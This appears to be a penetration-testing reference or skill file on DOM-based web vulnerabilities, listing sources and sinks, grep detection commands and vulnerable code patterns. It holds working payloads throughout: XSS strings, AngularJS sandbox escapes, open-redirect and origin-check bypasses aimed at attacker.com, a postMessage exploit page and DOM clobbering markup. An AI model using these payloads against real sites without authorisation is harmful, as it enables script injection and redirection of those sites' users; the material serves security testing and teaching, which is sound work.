---
name: dom_based
description: DOM-based vulnerabilities - sources, sinks, DOM XSS, DOM clobbering, client-side prototype pollution, postMessage attacks, open redirect
---

# DOM-Based Vulnerabilities

DOM-based vulnerabilities occur when JavaScript reads from attacker-controlled sources and passes that data into dangerous sinks — all without the data ever going server-side. Detection requires JavaScript analysis; traditional server-side scanners often miss them entirely.

## Source → Sink Model

**Sources** (attacker-controlled inputs to the DOM)
- `location.href`, `location.search`, `location.hash`, `location.pathname`
- `document.URL`, `document.documentURI`, `document.referrer`
- `window.name`
- `postMessage` data
- `localStorage`, `sessionStorage`, `IndexedDB`
- Cookie values
- DOM attributes (e.g., `document.baseURI`)

**Sinks** (dangerous functions that cause the vulnerability)

| Sink | Vulnerability |
|------|--------------|
| `innerHTML`, `outerHTML` | DOM XSS |
| `document.write()`, `document.writeln()` | DOM XSS |
| `eval()`, `setTimeout(string)`, `setInterval(string)` | DOM XSS / code execution |
| `location`, `location.href`, `location.assign()` | Open redirect / script protocol |
| `jQuery.html()`, `$(selector)`, `$.parseHTML()` | DOM XSS |
| `fetch(url)`, `XMLHttpRequest.open(url)` | SSRF / resource load |
| `element.src`, `element.action` | Resource injection |
| `document.cookie` | Cookie injection |
| `localStorage.setItem(key, data)` | Stored XSS via DOM |

## DOM XSS

### Detection (JavaScript Grep)

```javascript
// High-priority source: location.hash → innerHTML
grep -r "innerHTML\|outerHTML\|document\.write" --include="*.js" .
grep -r "location\.hash\|location\.search\|location\.href" --include="*.js" .

// jQuery patterns
grep -r "\$([^)]*\(location\|document\.URL\|window\.name" --include="*.js" .
```

### Common Vulnerable Patterns

```javascript
// Pattern 1: Hash → innerHTML
var hash = decodeURIComponent(location.hash.slice(1));
document.getElementById('output').innerHTML = hash;
// Exploit: https://example.com/#<img src=x onerror=alert(document.domain)>

// Pattern 2: jQuery with location
$(location.hash)   // selects OR creates element
// Exploit: https://example.com/#<img src=x onerror=alert(1)>

// Pattern 3: document.write from URL param
var search = new URLSearchParams(location.search).get('q');
document.write('<div>' + search + '</div>');
// Exploit: ?q=<script>alert(1)</script>

// Pattern 4: eval with data
var callback = location.search.split('callback=')[1];
eval(callback + '()');
// Exploit: ?callback=alert(1)//

// Pattern 5: AngularJS template injection (sandbox escape)
{{constructor.constructor('alert(1)')()}}
// Only if ng-app on an element wrapping user data
```

### Angular Sandbox Escalation

```javascript
// AngularJS 1.x sandbox escapes
{{constructor.constructor('alert(document.domain)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('z=alert(1)');}}
```

## DOM-Based Open Redirect

```javascript
// Vulnerable pattern
var next = new URLSearchParams(location.search).get('next');
location.href = next;
// Exploit: ?next=https://attacker.com

// Also:
document.location = userInput;
window.open(userInput);
```

Payload bypasses for open redirect sinks:
```
https://attacker.com
//attacker.com
/\attacker.com          # backslash interpreted as / by some browsers
javascript:alert(1)     # only if sink is href/location
data:text/html,<script>alert(1)</script>
```

## postMessage Vulnerabilities

```javascript
// Vulnerable: no origin check
window.addEventListener('message', function(e) {
  document.getElementById('output').innerHTML = e.data;
  // or: eval(e.data);
});
```

Exploit from attacker page:
```html
<iframe src="https://victim.com/page" id="f"></iframe>
<script>
  document.getElementById('f').onload = function() {
    this.contentWindow.postMessage(
      '<img src=x onerror=alert(document.domain)>',
      '*'
    );
  };
</script>
```

Weak origin check bypass:
```javascript
// Target checks: if (event.origin.indexOf('trusted.com') !== -1)
// Bypass: use origin = https://evil-trusted.com or https://trusted.com.evil.com
```

## DOM Clobbering

Overwrite JavaScript globals using HTML element IDs and names:

```html
<!-- Clobber window.x with a DOM element -->
<input id="x" value="javascript:alert(1)">
<!-- If code later does: element.setAttribute('href', window.x || '/safe') -->
<!-- → href becomes javascript:alert(1) -->

<!-- Clobber an object property via nested elements -->
<a id="config"><a id="config" name="transportUrl" href="javascript:alert(1)"></a></a>
<!-- window.config.transportUrl returns the href value -->
```

Inject via stored XSS (e.g., in HTML comments/fields that allow anchor tags):
```html
<a id="config" name="returnUrl" href="//attacker.com"></a>
```

## Stored DOM XSS

Pattern: data stored server-side → retrieved via safe method → written into DOM via dangerous sink.

```javascript
// Server stores: {"comment": "<img src=x onerror=alert(1)>"}
// Client fetches and does:
var comment = data.comment;
document.getElementById('comment').innerHTML = comment;  // sink
```

Distinct from reflected DOM XSS because the payload survives across page loads.

## Validation Approach

1. Use browser DevTools "Sources" panel to search for dangerous source→sink chains in JS files
2. Test `location.hash`, `location.search`, `window.name` as inputs to all identified sinks
3. Inject `<img src=x onerror=alert(document.domain)>` via each vector
4. For postMessage: write PoC page, host on attacker domain, send to iframe
5. Evidence: browser console shows alert + confirm DOM domain — proxy request ID not needed for reflected DOM XSS but capture any related requests

## Tools

- Burp DOM Invader — automated source/sink mapping in browser
- `DOMinator` — deprecated but conceptual reference
- Manual JS search: `grep -r "innerHTML\|eval\|document\.write" --include="*.js"`
- Browser DevTools breakpoints on innerHTML setter
